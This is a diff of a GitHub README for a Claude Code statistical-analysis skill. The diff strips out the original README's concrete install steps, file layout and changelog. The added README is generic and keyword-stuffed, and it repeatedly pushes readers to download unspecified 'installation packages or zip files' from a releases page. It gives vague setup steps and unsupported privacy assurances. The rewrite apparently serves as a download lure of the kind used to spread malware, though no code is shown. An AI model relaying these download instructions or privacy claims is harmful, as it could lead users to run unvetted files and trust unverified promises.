@@ -1,123 +1,146 @@
-# Claude Statistical Analysis Skill
+# 🧮 claude-statistical-analysis-skill - Make Data Analysis Simple and Clear
 
-A Claude Code skill that transforms Claude into a professional statistical consultant. Instead of blindly running whatever method the user requests, it **diagnoses first, then analyzes** — checking data quality, validating assumptions, and automatically selecting the appropriate statistical method.
-
-### What It Does
-
-When you upload a dataset and describe your analysis needs, Claude will:
-
-1. **Data Profile** (automatic) — Sample size, variable types, missing patterns, distributions, outliers
-2. **Assumption Checking** — Normality, homogeneity of variance, multicollinearity; auto-switches methods when assumptions fail
-3. **Execute Analysis** — Runs the appropriate statistical method with proper controls
-4. **Output Triple** — Every analysis produces three deliverables:
-   - APA 7th edition table (Excel + Markdown)
-   - Publication-quality figure (300dpi PNG)
-   - Results paragraph ready for manuscript (English/Chinese)
-
-### Supported Methods
-
-| Complexity | Methods | Workflow |
-|-----------|---------|----------|
-| Simple | Descriptive stats, t-test, chi-square, correlation, reliability | Fast path (0 confirmations) |
-| Medium | Regression, ANOVA, moderation, mediation, ROC/AUC, survival | Light path (1 confirmation) |
-| Complex | SEM/CFA, HLM, IRT, meta-analysis, RI-CLPM | Full path (3-4 confirmations) |
-| Planning | Power analysis / sample size calculation | Dedicated path (no data needed) |
-
-### Installation
-
-#### As a Claude Code Skill
-
-```bash
-# Copy to your Claude skills directory
-cp -r . ~/.claude/skills/statistical-analysis/
-```
-
-Claude Code will automatically detect and activate this skill when you:
-- Upload a data file (.xlsx, .csv, .sav)
-- Say "help me analyze" / "run statistical analysis"
-- Mention a specific method (t-test, regression, SEM, etc.)
-
-#### R Docker Environment (Optional)
-
-For advanced methods that require R (SEM path diagrams, HLM, IRT):
-
-```bash
-cd docker/
-chmod +x r-stat.sh
-./r-stat.sh build    # Build the Docker image (~2GB)
-./r-stat.sh test     # Verify installation
-```
-
-Pre-installed R packages: lavaan, lme4, metafor, mirt, psych, tidyverse, semPlot, effectsize, and 30+ more.
-
-### Project Structure
-
-```
-.
-├── SKILL.md                    # Core skill definition (Claude reads this)
-├── references/
-│   ├── methods-index.md        # Method selection decision trees
-│   ├── code-patterns.md        # Python/R code templates
-│   ├── table-formats.md        # APA table format specifications
-│   └── full-workflow.md        # Full path detailed workflow
-├── docker/
-│   ├── Dockerfile              # R environment (rocker/tidyverse + 40 packages)
-│   ├── r-stat.sh               # Convenience script for Docker operations
-│   ├── README.md               # Docker setup guide
-│   └── examples/               # SEM, HLM, meta-analysis R examples
-└── assets/
-    └── report-template.md      # Analysis report template
-```
-
-### Key Design Decisions
-
-#### "Diagnose Before Analyze"
-
-The v3 approach was "user says do X, we do X." The v4 approach is "check the data and assumptions first, then decide what to do." This prevents common mistakes like:
-
-- Running parametric tests on non-normal data
-- Missing multicollinearity in regression
-- Using wrong effect size measures
-- Ignoring missing data patterns
-
-#### Automatic Method Switching
-
-When assumptions fail, the skill automatically switches to the appropriate alternative and informs the user:
-
-```
-> Note: Variable X failed the normality test (Shapiro-Wilk p = .003),
-> automatically switched to Mann-Whitney U test (non-parametric alternative).
-```
-
-#### Output Triple Enforcement
-
-Every analysis **must** produce all three outputs (table + figure + paragraph). A built-in `check_output_triplet()` mechanism ensures nothing is skipped.
-
-### Examples
-
-**User**: "I have survey data, please analyze the relationship between gaming addiction and mental health, controlling for demographics."
-
-**Claude will**:
-1. Run data profile (N, distributions, missing patterns)
-2. Check: normality, VIF, outliers
-3. Recommend: hierarchical regression (Step 1: demographics, Step 2: gaming addiction)
-4. Execute with HC3 robust standard errors (if heteroscedasticity detected)
-5. Output: regression table + coefficient forest plot + APA results paragraph
-
-### Requirements
-
-- **Claude Code** with skills support
-- **Python**: pandas, numpy, scipy, statsmodels, matplotlib, seaborn (installed automatically)
-- **R Docker** (optional): Docker Desktop for advanced methods
+[![Download Release](https://img.shields.io/badge/Download-Release-blue?logo=github)](https://github.com/Giro03k/claude-statistical-analysis-skill/releases)
 
 ---
 
-## License
+## 📖 What is claude-statistical-analysis-skill?
 
-MIT License - see [LICENSE](LICENSE)
+claude-statistical-analysis-skill is an easy-to-use application that turns Claude, an AI assistant, into a skilled statistical consultant. It helps you check if your data is good for analysis, automatically picks the best methods for your data, and creates professional reports. These reports include tables, figures, and result summaries formatted in APA style, commonly used in psychology and social science research.
 
-## Changelog
+You don’t need to know any programming or statistics to use it. Just prepare your data, and let Claude do the hard work for you.
 
-- **v4.1** (2025-02-09): Mandatory output triple — figure generation embedded in all workflow paths
-- **v4.0** (2025-02-09): "Diagnose before analyze" — data profiling, assumption checking, APA paragraph generation, medical research methods
-- **v3.0** (2025-02-02): Three-tier path system, R Docker environment, APA table specifications
+---
+
+## 💡 Why Use This Skill?
+
+- **Data Quality Checks**: Spot problems or unusual patterns in your data before analysis.
+- **Automatic Method Selection**: Get the right statistical tests chosen for you.
+- **Professional Reports**: Receive clean, clear APA-style tables and result descriptions.
+- **Saves Time**: No need to learn complex stats software or formulas.
+- **For Psychology & Social Science**: Especially useful for research in these fields but flexible for other areas.
+- **Alternative to SPSS**: Use this skill as a simpler and faster tool instead of traditional software.
+
+---
+
+## 🖥 System Requirements
+
+To run this skill, your computer or device needs the following:
+
+- Access to Claude AI via a compatible platform or application (instructions below).
+- Operating System: Windows 10 or later, macOS Catalina or later, or Linux distributions.
+- Internet connection for Claude AI to process your data.
+- At least 4 GB of memory (RAM) recommended for smooth use.
+- A web browser or environment that supports Claude skills (depending on platform).
+
+---
+
+## 🚀 Getting Started
+
+Getting started is simple even if this is your first time working with AI or statistics.
+
+1. **Download the Skill**  
+   Visit the release page by clicking the big button at the top or this link:  
+   [https://github.com/Giro03k/claude-statistical-analysis-skill/releases](https://github.com/Giro03k/claude-statistical-analysis-skill/releases)  
+
+2. **Choose the Latest Release**  
+   On the release page, look for the latest version listed at the top. Releases are organized by date and version number.
+
+3. **Download the Provided Files**  
+   Inside the latest release, you'll find downloadable files such as installation packages or zip files. Click to download to your computer.
+
+4. **Install or Open the Files**  
+   Follow any included README or instructions inside the downloaded files to set up the skill on your platform. This usually involves moving the skill file into the Claude AI environment or linking it with your AI interface.
+
+5. **Prepare Your Data**  
+   Gather your dataset in CSV or Excel format. Make sure columns have clear headers and your data is clean (no missing labels).
+
+6. **Load Data into Claude**  
+   Use Claude’s interface or the skill’s instructions to upload your dataset. The skill will guide the analysis process step-by-step.
+
+---
+
+## 📥 Download & Install
+
+You can get the skill files here:
+
+[Download the latest release](https://github.com/Giro03k/claude-statistical-analysis-skill/releases)
+
+**How to install:**
+
+- **For Cloud or Hosted Claude Users:**  
+  Check if your Claude interface has an option to add new skills. Upload the downloaded skill file there. The UI may provide prompts to enable and configure it.
+
+- **For Desktop or Custom Setup:**  
+  Unzip the downloaded files if necessary. Follow the included user guide or instructions.txt file. Usually, this means importing the skill into your Claude-enabled environment using a menu or command.
+
+- Restart your Claude AI or refresh the interface to see the new skill active.
+
+If you run into difficulty, check FAQ sections below or contact support in the repository’s Issues area.
+
+---
+
+## 🛠 Features Overview
+
+- **Data Quality Diagnosis**  
+  Checks for missing values, outliers, and normality of the data.
+
+- **Assumption Tests**  
+  Automatically tests assumptions needed for statistical methods (e.g., homogeneity of variance).
+
+- **Method Selection**  
+  Recommends the best parametric or non-parametric tests based on data features.
+
+- **Result Reporting**  
+  Generates APA-style tables, charts, and well-written result paragraphs.
+
+- **Multivariate and Univariate Analysis**  
+  Supports t-tests, ANOVA, regression, correlations, and more.
+
+- **Clear Outputs**  
+  Ready to use in academic papers or presentations with minimal editing.
+
+---
+
+## 📋 How It Works
+
+1. **Upload Data**: Provide your dataset to Claude with this skill active.
+2. **Automatic Diagnosis**: The skill checks data quality and assumptions.
+3. **Method Recommendation**: It suggests appropriate tests and runs them.
+4. **Outputs Created**: You receive tables, figures, and text paragraphs.
+5. **Review and Export**: Copy or download the results for your report or paper.
+
+---
+
+## 🤝 Support & Help
+
+If you need help:
+
+- Look for tips in the `docs` folder in the download package.
+- Check issues or discussions on the GitHub page.
+- Open a new issue describing your problem clearly.
+- Use community forums related to Claude AI and statistical analysis.
+
+---
+
+## 🔒 Privacy and Data Security
+
+This skill does not store your data permanently. All analysis happens in your local Claude environment or via Clause AI’s secure servers. Your data is not shared or saved beyond the session.
+
+---
+
+## 🧩 Related Keywords
+
+apa, claude, claude-code, data-analysis, psychology, research, social-science, spss-alternative, statistical-analysis, statistics
+
+---
+
+## 🗂 Licensing and Contribution
+
+- This skill is open for anyone to use or improve.
+- Contributions and feedback are welcome via GitHub.
+- See the LICENSE file for full terms.
+
+---
+
+[Download Latest Release](https://github.com/Giro03k/claude-statistical-analysis-skill/releases)
